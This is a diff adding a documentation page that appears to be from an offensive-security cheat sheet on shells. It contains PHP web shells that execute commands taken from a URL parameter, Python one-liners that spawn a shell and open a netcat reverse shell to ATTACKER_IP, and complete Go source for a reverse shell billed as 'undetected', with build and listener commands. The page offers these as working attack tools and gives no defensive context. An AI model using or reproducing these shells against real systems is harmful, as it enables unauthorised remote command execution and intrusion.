@@ -1,0 +1,137 @@
+---
+sidebar_position: 2
+title: Shell's - Binaries
+---
+
+
+
+import Tabs from '@theme/Tabs';
+import TabItem from '@theme/TabItem';
+
+
+
+- **Static Binaries:** <a class="button button--outline button--warning" href="https://repology.org/">REPOLOGY.org</a> <a class="button button--outline button--warning" href="https://ubuntu.pkgs.org/">PKGS.org</a> <a class="button button--outline button--info" href="https://github.com/andrew-d/static-binaries">Binaries GitHub</a>
+
+
+## PHP
+
+
+```php
+<?php echo shell_exec($_GET["cmd"]);?>
+```
+
+```php
+<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
+```
+
+```php
+<?php system($_GET['cmd']);?>
+```
+
+
+## Python
+
+
+```py
+# Executing a SHELL from a Running Python Instance
+__import__('os').system('bash')
+```
+
+
+```py
+# Executing a Reverse SHELL from a Running Python Instance
+eval('__import__("os").system("mkfifo /tmp/dktkcfp; nc ATTACKER_IP PORT 0</tmp/dktkcfp | /bin/sh >/tmp/dktkcfp 2>&1; rm /tmp/dktkcfp")')
+```
+
+<br/>
+
+## GO Reverse Shell
+
+:::info Features Missing
+
+**Mostly Stable and Undetected. Works on `Windows - Linux`**.
+
+:::
+
+
+<br/>
+
+```batch
+:: Build
+:: This is going to Generate a Binary Named [GoRevShell]
+go build GoRevShell.go
+
+:: Usage
+GoRevShell -i <IP> -p <PORT>
+
+:: Catching The Shell
+rlwrap nc -nvlp <PORT>
+```
+
+<details><summary>SOURCE</summary>
+<p>
+
+```go
+package main
+
+import (
+	"bufio"
+	"flag"
+	"fmt"
+	"net"
+	"os"
+	"os/exec"
+	"runtime"
+)
+
+func execute(msg string) (string, []string) {
+	var exe string
+	os := runtime.GOOS
+
+	if os == "windows" {
+		exe = "cmd"
+	} else if os == "linux" {
+		exe = "/bin/bash"
+	} else {
+		fmt.Println("Unknown Arch. Terminating.")
+	}
+
+	args := []string{}
+	if exe == "cmd" {
+		args = append(args, "/C")
+	} else {
+		args = append(args, "-c")
+	}
+
+	args = append(args, msg)
+	return exe, args
+}
+
+func main() {
+	args := os.Args
+	if len(args) < 2 {
+		fmt.Println("Usage: [OPTIONS]\n\n GO Reverse Shell\n\nOptions:\n -i HOST -p PORT")
+		return
+	}
+
+	I_P := flag.String("i", "", "HOST")
+	L_PORT := flag.String("p", "", "PORT")
+	flag.Parse()
+
+	conn, _ := net.Dial("tcp", fmt.Sprintf("%s:%s", *I_P, *L_PORT))
+	for {
+		cwd, _ := os.Getwd()
+		fmt.Fprintf(conn, "\n%s> ", cwd)
+		msg, _ := bufio.NewReader(conn).ReadString('\n')
+		exe, args := execute(msg)
+		out, err := exec.Command(exe, args...).Output()
+		if err != nil {
+			fmt.Println(conn, "\n\n%s\n", err)
+		}
+		fmt.Fprintf(conn, "%s", out)
+	}
+}
+```
+
+</p>
+</details>
